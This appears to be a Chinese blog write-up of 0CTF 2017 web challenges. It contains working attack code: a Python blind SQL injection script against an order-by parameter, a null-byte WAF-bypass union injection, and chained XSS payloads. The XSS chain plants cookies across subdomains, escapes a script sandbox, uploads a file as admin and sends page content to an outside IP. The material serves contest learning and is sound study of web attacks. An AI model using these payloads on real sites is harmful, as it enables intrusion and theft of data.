---
title: 0ctf201 web部分writeup
date: 2017-03-21 13:55:12
tags:
- ctf
- Blogs
categories:
- Blogs
---


纪念下偷偷登上萌新榜第一的比赛，也实现了比赛前的愿望，0ctf争取不0分，rsctf争取高名次，:>

![image_1bbm7t6mv1lckjf7m4o10tq1s81g.png-31.5kB][1]
![image_1bbm7tqmjkb011vho2e19mg1j7mt.png-4.2kB][2]
![image_1bbm7umpc158d118d1elc3i71j6g1a.png-24.2kB][3]


<!--more-->

# Temmo's Tiny Shop #

题目是个类似于小卖铺的站，最有趣的是刚开始的时候，这题进去是钱很多的，可以随便买，也可以看到hint
```
OK! Now I will give some hint: you can get flag by use `select flag from b7d8769d64997e392747dbad9cd450c4`
```

后来突然题目就改了，只有4000块了，买不了hint，很气...(看别人的wp听说admin是弱口令还是什么的，里面一百多万可以随便买...

逛逛整个站，有下面几个信息：

1、登录上去后，可以购买东西，购买东西可以退货，这个过程是不需要验证啊什么的，但是不存在竞争。

2、购买退货这里的逻辑里有个id，但是怎么测试都不对，可能是有intval吧

3、action是白名单，只要不是需要的那几个就会直接拦截，order是黑名单

4、不存在能被盲测出来的二次注入

那么问题很清晰了，orderby是最可能存在注入的地方，但是比较无情的是这里waf非常的迷，而且还有长度的限制，虽然我没踩这个坑，但是我觉得没拿到hint应该是注不了的（长度不够）

order 白名单黑名单都有，好像就\w可以。特殊符号跟中文符号也不行。还有对user,database关键词的检测。白名单:&,()0-9a-Z

但是可以通过left来进行like盲注，条件符合就按照name排列，不符合就按price排列（你需要买2个不同的东西）

有个关键点事关于盲注的，因为order这里是有长度限制的，长度又不够我们加函数来截断，所以只能用%做通配符来跑最后一位，脚本如下

```
import requests
import threading
import time
from random import Random
url = "http://202.120.7.197/"


cookie = {'PHPSESSID': 'qlqmjbq7uglcr0onm1lmm4ndg4'}
r=requests.get(url+'app.php?action=search&keyword=&order=if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),3))like(0x2562)),name,price)', cookies=cookie)

err = r.text

s = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'

def check(payload):

	cookie = {'PHPSESSID': 'qlqmjbq7uglcr0onm1lmm4ndg4'}
	r=requests.get(url+'app.php?action=search&keyword=&order='+payload, cookies=cookie)
	return r.text

flag = ""

for m in range(1,35):
	for i in s:
		payload = "if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),%s))like(0x25%s)),name,price)" % (str(m), hex(ord(i))[2:])
		if check(payload) != err:
			flag +=i
			print flag
			break
```


# KoG #

这题其实说起来挺难得，不是js老司机根本调不出来，打开题目就能看出来了，页面中是通过id来计算响应的hash然后请求服务器，然后id这里是有判断的，如果被拦了就会返回 wrongboy，为了能得到想要的字符串，我需要下断点把几个判断跳过。

要知道有句话说得好，js混淆永远是纸糊的。

下断点跟踪判断，合并发现更改某几个变量为true/false可以得到字符串参数的正确hash值，
把脚本保存到本地自己更改，边跟边删除掉一些逻辑最后发现最本质的解法是把所有的

类似 
```
($33<<24>>24)>(47);
($36<<24>>24)<(58)
```
判断一个范围在 47 58 之间的都进行更改（有多处，但有些是没用的）。 ($n<<24>>24)==(0) 的不需要管它

```
($变量<<24>>24)>(0);
($变量<<24>>24)<(128);
```

然后在本地测试通过。后面就是最最普通的注入了，不多说了。

# simplesqlin #

题目其实说起来挺简单的，但是却是个不常用的黑魔法，注入点就摆在面前，看上去好像一切都没有过滤，但是事实上主要的几个语句都被拦了，一个select被干了就已经没什么办法了，当前表也没什么东西。

虽然不知道黑魔法是什么地方最早爆出来的，但我看的是这篇文章

[https://www.exploit-db.com/papers/17934/](https://www.exploit-db.com/papers/17934/)

在select的中间加入类似于%00这样的就会绕过waf，没仔细测试，基本上%0几都可以。

```
payload

http://202.120.7.203/index.php?id=5 union sele%0bct 1,(selec%00t flag fro%00m flag limit 0,1),3%23
```



# 复杂xss #

我感觉很棒的一题，下面我稍微讲仔细一点儿。

第一个页面url是http://government.vip/

![image_1bbm81fi31ic413d1vkjuad4q1n.png-42.1kB][4]

然后flag是在http://admin.government.vip:8000另一个域下

第一部分这里payload是没做任何限制的，你可以随便构造一个img标签然后监听过去看看，这里是可以执行任意js的。

然后我们直接打开http://admin.government.vip:8000看看，有个登录框，test test可以登录成功，仔细观察站内，我们得到这样一个信息

![image_1bbm867761jslt3s60i1punqj324.png-59.2kB][5]

页面内的username是从cookie里获取的，而且username这个cookie不是httponly，通过设置cookie，我们可以构造xss，执行任意js，但页面有沙箱禁用了部分函数。

之后我们还看到题目给了提示说只有admin可以upload shell，访问下upload看看，页面存在，get请求会405，只能发送post请求。

稍微整理下已有的条件：

1、url1是整站的根目录，可以执行任意js

2、url2是整站的子域，通过设置cookie可以执行js

3、我们的目标是在admin上上传文件，还要获取到返回回来


你可能觉得现在的条件并不够，因为你可能不知道cookie的特性。

![image_1bbnj20hv1tirtiq1ec7vrc2k22h.png-113.9kB][6]

首先js是可以设置cookie的

但是在web内有个很多人都知道的的问题，就是同源策略

![image_1bbnj670k1kjd1fih1khj1oegq6n2u.png-340.6kB][7]

但cookie中，又有点儿不一样

![image_1bbnj81aj1i95ua2ea91c3s5rq3b.png-403.3kB][8]

cookie是不区分端口以及http/https的，而对于domain是向上匹配的，再来看个例子

![image_1bbnjg0gu18an1nn2dhm7bd1b4h3o.png-900.4kB][9]

也就是说我们在根域是可以设置子域的cookie的。

所以第一部分的payload就是

```
<script>
document.cookie="username=a<script>window.location.href='http://115.28.78.16?id=test'<\/script>;domain=.government.vip; path=/;"

window.location.href="http://admin.government.vip:8000";
</script>
```

现在问题来了，我们通过写js来读取upload的内容，这里我测试是返回405的，看小m的wp这里他是读到了内容。。我也不是很懂

这里遇到了新的难题，沙箱

```
<script>
//sandbox
delete window.Function;
delete window.eval;
delete window.alert;
delete window.XMLHttpRequest;
delete window.Proxy;
delete window.Image;
delete window.postMessage;
</script>
```

反正我是没办法在沙箱情况下请求到upload的内容，这里我选择引入iframe标签，然后读取iframe的内容发送回来。

payload
```
<script>
document.cookie="username=aa<iframe id='test' src='upload'></iframe><script>window.location.href='http://115.28.78.16?id='+encodeURIComponent(document.getElementById('test').contentWindow.document.documentElement.outerHTML)<\/script>;domain=.government.vip; path=/;"

window.location.href="http://admin.government.vip:8000";
</script>
```

紧接着我发现，upload页面是没有沙箱的，我们通过向iframe中写入js执行就可以做我们想做的事情了

```
<script>
document.cookie="username=aa</iframe><script>var iframe = document.createElement('iframe')<\/script><script>iframe.id = 'ddog'<\/script><script>iframe.name = 'iframe1'<\/script><script>iframe.src='upload'<\/script><script>document.body.appendChild(iframe)<\/script><script>var content=\"<script>var xhr = new XMLHttpRequest()<\\/script><script>xhr.open('POST', 'upload', false)<\\/script><script>xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')<\\/script><script>xhr.send('file=a')<\\/script><script>var mess = xhr.response<\\/script><script>document.write(encodeURIComponent(mess))<\\/script>\"<\/script><script>setTimeout(\"iframe.contentWindow.document.write(content)\", 3000)<\/script><script>document.body.appendChild(iframe)<\/script><script>window.onload = setTimeout(\"window.location.href='http://115.28.78.16?id='+encodeURIComponent(document.getElementById('ddog').contentWindow.document.documentElement.outerHTML)\",3000)<\/script>;domain=.government.vip; path=/;"

window.location.href="http://admin.government.vip:8000";
</script>
```

这个应该是没别的办法了，有个关键的问题是同源策略，只有我们在iframe内引入了本域的页面，然后向upload发送xhr请求，才是有效的，不然会被同源策略拦截，接下来我们需要构造一个上传文件的js，这里可以直接去burp扒一个下来

```
<script>
function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "upload.php", false);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------12264101169922");
        xhr.withCredentials = true;
        var body = "-----------------------------12264101169922\r\n" + 
          "Content-Disposition: form-data; name=\"file\"; filename=\"shell\"\r\n" + 
          "Content-Type: text/plain\r\n" + 
          "\r\n" + 
          "shell\r\n" + 
          "-----------------------------12264101169922\r\n" + 
          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
          "\r\n" + 
          "\xcc\xe1\xbd\xbb\xb2\xe9\xd1\xaf\r\n" + 
          "-----------------------------12264101169922--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
        alert(xhr.response)
      }

submitRequest()
</script>
```

由于代码里有太多的分号，而cookie中分号是区别字段的，这里必须要urlencode，而且还需要专门多一句写入页面，最终payload如下

```
<script>
document.cookie="username=aa</iframe><script>var iframe = document.createElement('iframe')<\/script><script>iframe.id = 'ddog'<\/script><script>iframe.name = 'iframe1'<\/script><script>iframe.src='upload'<\/script><script>document.body.appendChild(iframe)<\/script><script>var content=\"<script>document.write(decodeURIComponent('%3Cscript%3E%0Afunction%20submitRequest%28%29%0A%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20var%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20%20%20%20%20xhr.open%28%22POST%22%2C%20%22upload%22%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20xhr.setRequestHeader%28%22Accept%22%2C%20%22text%2fhtml%2Capplication%2fxhtml%2bxml%2Capplication%2fxml%3Bq%3D0.9%2C%2a%2f%2a%3Bq%3D0.8%22%29%3B%0A%20%20%20%20%20%20%20%20xhr.setRequestHeader%28%22Accept-Language%22%2C%20%22zh-CN%2Czh%3Bq%3D0.8%2Cen-US%3Bq%3D0.5%2Cen%3Bq%3D0.3%22%29%3B%0A%20%20%20%20%20%20%20%20xhr.setRequestHeader%28%22Content-Type%22%2C%20%22multipart%2fform-data%3B%20boundary%3D---------------------------12264101169922%22%29%3B%0A%20%20%20%20%20%20%20%20xhr.withCredentials%20%3D%20true%3B%0A%20%20%20%20%20%20%20%20var%20body%20%3D%20%22-----------------------------12264101169922%5Cr%5Cn%22%20%2b%20%0A%20%20%20%20%20%20%20%20%20%20%22Content-Disposition%3A%20form-data%3B%20name%3D%5C%22file%5C%22%3B%20filename%3D%5C%22shell%5C%22%5Cr%5Cn%22%20%2b%20%0A%20%20%20%20%20%20%20%20%20%20%22Content-Type%3A%20text%2fplain%5Cr%5Cn%22%20%2b%20%0A%20%20%20%20%20%20%20%20%20%20%22%5Cr%5Cn%22%20%2b%20%0A%20%20%20%20%20%20%20%20%20%20%22shell%5Cr%5Cn%22%20%2b%20%0A%20%20%20%20%20%20%20%20%20%20%22-----------------------------12264101169922%5Cr%5Cn%22%20%2b%20%0A%20%20%20%20%20%20%20%20%20%20%22Content-Disposition%3A%20form-data%3B%20name%3D%5C%22submit%5C%22%5Cr%5Cn%22%20%2b%20%0A%20%20%20%20%20%20%20%20%20%20%22%5Cr%5Cn%22%20%2b%20%0A%20%20%20%20%20%20%20%20%20%20%22%5Cxcc%5Cxe1%5Cxbd%5Cxbb%5Cxb2%5Cxe9%5Cxd1%5Cxaf%5Cr%5Cn%22%20%2b%20%0A%20%20%20%20%20%20%20%20%20%20%22-----------------------------12264101169922--%5Cr%5Cn%22%3B%0A%20%20%20%20%20%20%20%20var%20aBody%20%3D%20new%20Uint8Array%28body.length%29%3B%0A%20%20%20%20%20%20%20%20for%20%28var%20i%20%3D%200%3B%20i%20%3C%20aBody.length%3B%20i%2b%2b%29%0A%20%20%20%20%20%20%20%20%20%20aBody%5Bi%5D%20%3D%20body.charCodeAt%28i%29%3B%20%0A%20%20%20%20%20%20%20%20xhr.send%28new%20Blob%28%5BaBody%5D%29%29%3B%0A%20%20%20%20%20%20%20%20document.write%28encodeURIComponent%28xhr.response%29%29%0A%20%20%20%20%20%20%7D%0A%0AsubmitRequest%28%29%0A%3C%2fscript%3E'))<\\/script>\"<\/script><script>setTimeout(\"iframe.contentWindow.document.write(content)\", 3000)<\/script><script>document.body.appendChild(iframe)<\/script><script>window.onload = setTimeout(\"window.location.href='http://115.28.78.16?id='+encodeURIComponent(document.getElementById('ddog').contentWindow.document.documentElement.outerHTML)\",3000)<\/script>;domain=.government.vip; path=/;"

window.location.href="http://admin.government.vip:8000";
</script>
```

get flag

# simplexss #

这个题目说实话有点儿难的，最后是被window的一个特性坑，waf过滤稍微有点儿过分，fuzz一发，可显字符只剩下

```
*+-<=\^_|~
```

无意中测试出来`\\1931235898`-->对应的ip

![image_1bbnm3785lrg1k0pe0iu4b8ij45.png-49.3kB][10]

但script不会执行，因为script没办法闭合，所以只能想别的办法

这里想到的解决办法是link的import属性，是h5新提出来的特性，用来加载模板，我们可以通过插入link标签远程import我的页面，执行js。

跨域的问题很好解决，只要在自己的服务器设置，响应头为

```
access-control-allow-origin: *
```

这里有个大坑，在windows下`//`是有特殊意义的，会被解析为`file://`，而在firefox和非windows下的chrome，这里会被解析为和主站相同的协议，也就是https协议.

事实上，后台是mac...好像是个真的电脑...也就是说，如果是自签名证书，浏览器会直接拦截，而ip是不能被颁发证书的。

所以我们必须绕过点的限制，引入一个https站下的资源，这里可以用中文的句号

最终payload为
```
<link rel=import hred=\\xss。lt
```

执行js读取flag.php就好了




  [1]: http://static.zybuluo.com/LoRexxar/i6r7eapfqxz18e7frsexxp6d/image_1bbm7t6mv1lckjf7m4o10tq1s81g.png
  [2]: http://static.zybuluo.com/LoRexxar/9cbjbavbdg59k7lbzdt882ct/image_1bbm7tqmjkb011vho2e19mg1j7mt.png
  [3]: http://static.zybuluo.com/LoRexxar/fcsi2y6azh4w2cn1hi7vsaox/image_1bbm7umpc158d118d1elc3i71j6g1a.png
  [4]: http://static.zybuluo.com/LoRexxar/7iglrk439xnneps9zyt0bje8/image_1bbm81fi31ic413d1vkjuad4q1n.png
  [5]: http://static.zybuluo.com/LoRexxar/d7oo6ll6tzhoxhpi9s0ya4ge/image_1bbm867761jslt3s60i1punqj324.png
  [6]: http://static.zybuluo.com/LoRexxar/0fo4y89aul236z6zeq20vzl1/image_1bbnj20hv1tirtiq1ec7vrc2k22h.png
  [7]: http://static.zybuluo.com/LoRexxar/hr86wmm3mehab6nubr7q2219/image_1bbnj670k1kjd1fih1khj1oegq6n2u.png
  [8]: http://static.zybuluo.com/LoRexxar/ugwkm2dhr9wyfcpa0ohocu31/image_1bbnj81aj1i95ua2ea91c3s5rq3b.png
  [9]: http://static.zybuluo.com/LoRexxar/wscz7k86wuyba78gi9ev4yc6/image_1bbnjg0gu18an1nn2dhm7bd1b4h3o.png
  [10]: http://static.zybuluo.com/LoRexxar/571vkxvwy40jemssd8kccqry/image_1bbnm3785lrg1k0pe0iu4b8ij45.png